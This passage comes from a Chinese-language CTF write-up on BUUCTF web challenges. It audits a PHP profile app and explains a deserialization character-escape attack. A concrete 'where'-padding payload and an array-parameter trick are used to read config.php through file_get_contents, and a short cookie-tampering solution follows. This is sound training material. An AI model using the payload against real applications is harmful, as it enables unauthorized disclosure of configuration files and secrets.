class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">update</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Please</span> <span class="title">Update</span> <span class="title">Your</span> <span class="title">Profile</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Email</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">email</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Nickname</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">nickname</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">file</span>&quot;&gt;<span class="title">Photo</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">photo</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">UPDATE</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个文件应该就是注册完之后进入的界面，写自己的信息，这个文件很重要，这里就是本题的重点！<br>这么多文件都审计完了一遍后，咱就来分析一下这一题怎么写，一眼望去我以为是在update.php中的上传文件的位置去getshell，但是注意有<code>md5</code>加密文件名，那后缀名也没了，所以不可能getshell</p>
<p>把重点放在这两个地方：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重点一 update.php</span></span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重点二，profile.php</span></span><br><span class="line">	<span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<p>上面那么多傻缺代码，到这里就简单的不能再简单了，看看，一个序列化，一个反序列化，像不像一对？那肯定就是在这里了，思路是利用反序列化的字符逃逸，让<code>photo=&#39;config.php&#39;</code>,从而<code>file_get_contents</code>将其输出，这样就能获得flag<br>字符逃逸怎么用不用我说了吧,比如序列化<code>&#123;s:4:&#39;test&#39;;s:3:&#39;bad&#39;;&#125;s:4:&#39;good&#39;;&#125;</code>,由于花括号被闭合，后面的参数被略去了，最终test&#x3D;bad，我们利用这一天也可以使得photo&#x3D;config.php</p>
<p><strong>目的payload：</strong><code>字符串&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code><br>为什么有两个花括号呢？：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>根据update.php中，对nickname的判断可以看到，假如我们想要逃逸，就必须要绕过这2个preg_match,我们要用数组绕过，使他们为null，从而逃过die！<br>因为是数组，所以形式大概为：（网图，偷懒）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666550296365-cd4e8554-cf18-47c2-be19-97cbc36539f3.png#averageHue=%232a2b23&clientId=ua3ff2799-afb0-4&from=paste&height=243&id=ud5689c0b&name=image.png&originHeight=304&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51165&status=done&style=none&taskId=u42b823c0-0f40-431e-94c0-61a138b7515&title=&width=460.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666550289947-46b992f0-22c2-4409-b424-9f36f4870849.png#averageHue=%23faf8f6&clientId=ua3ff2799-afb0-4&from=paste&height=67&id=uc37f2a07&name=image.png&originHeight=84&originWidth=621&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30793&status=done&style=none&taskId=ub7a99dd2-dde6-467a-8593-7ab926a0f5b&title=&width=496.8" alt="image.png"><br>也就是闭合2个括号了，一个是闭合array,一个闭合是整个序列化字段</p>
<p>根据class.php中的filter方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现，在update的过程中，数据是经过了这个函数的过滤的，这里会将单引号转义，所以就别想着sql注入了牡蛎牡蛎<br>所以重点看到下面的替换，会把<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>替换为hacker<br>我们就利用这个来构造payload<br>这五个字符串中就<code>where</code>长度为5，比hacker短一个单位，那就只能是他，因为我们的payload<code>字符串&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>字符串的长度肯定是比这整个payload的长度要短的，所以通过添加多个where来平衡！<br><code>where</code>长度为5，<code>where&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>长度为39，之间差了34长度，而替换为hacker后多1长度，所以要用34个where<br>最终payload：<br><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code><br>这样的话就让photo为config了，从而可以读出来，我们更新一下数据：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666550440571-a943f341-a311-4459-b547-25064851659a.png#averageHue=%23f7f5f5&clientId=ua3ff2799-afb0-4&from=paste&height=364&id=u810e641b&name=image.png&originHeight=455&originWidth=1136&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58667&status=done&style=none&taskId=u5af10fad-bc47-4679-97fc-71a54687caa&title=&width=908.8" alt="image.png"><br>这里抓包改为数组类型<br>然后访问个人资料：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666550468789-8fccc505-aa7a-45d5-b513-6635c9a05cca.png#averageHue=%23fcfcfc&clientId=ua3ff2799-afb0-4&from=paste&height=168&id=uf4982638&name=image.png&originHeight=210&originWidth=655&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6205&status=done&style=none&taskId=u63bfbe40-f477-4cb3-b136-b8e7e8a5fc9&title=&width=524" alt="image.png"><br>可以看到名字都变成了Array，这是因为nickname是个数组，访问源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666550511684-8795a18d-979d-43b5-abf1-3262a5de1e83.png#averageHue=%23fdfdfd&clientId=ua3ff2799-afb0-4&from=paste&height=58&id=u9196af01&name=image.png&originHeight=73&originWidth=1621&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7295&status=done&style=none&taskId=u4bf50833-d64d-416d-888f-d3d84046f09&title=&width=1296.8" alt="image.png"><br>有一串base64的编码，因为file_get_contents被base64加密了，所以我们解码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666550529778-5045400b-d6a2-46bc-8467-b769d0b09e99.png#averageHue=%23f9f9f8&clientId=ua3ff2799-afb0-4&from=paste&height=382&id=ub39318a2&name=image.png&originHeight=478&originWidth=1331&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94875&status=done&style=none&taskId=uc670f390-852e-4813-a302-0a23f980f0d&title=&width=1064.8" alt="image.png"><br>得到最终flag，说了一大堆，也是为了将详细一点，哈哈哈</p>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>BUUCTF第二页的最后一题！结束！<br>这一题很简单咯<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666550597234-44a119b8-bea4-4768-ada5-8287cbcb3ea7.png#averageHue=%2363553f&clientId=ua3ff2799-afb0-4&from=paste&height=410&id=ue6b304c6&name=image.png&originHeight=512&originWidth=1659&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33917&status=done&style=none&taskId=ufb25300f-3b06-43b7-84a2-a493e124c33&title=&width=1327.2" alt="image.png"><br>登录界面，都提示我们cookie和admin了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666550624916-39520f9f-7e02-45e7-8fd7-99e024b7b25d.png#averageHue=%23aba98a&clientId=ua3ff2799-afb0-4&from=paste&height=339&id=ue0d06a8b&name=image.png&originHeight=424&originWidth=1607&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53816&status=done&style=none&taskId=ud25aeb59-4e1d-4f21-bd60-a7990c20211&title=&width=1285.6" alt="image.png"><br>ezez</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/BUUCTF/" class="tag">#BUUCTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/08/BUUCTF4/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">BUUCTF Web Writeup 4</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/04/05/Socket-Boogipop/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">Socket</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>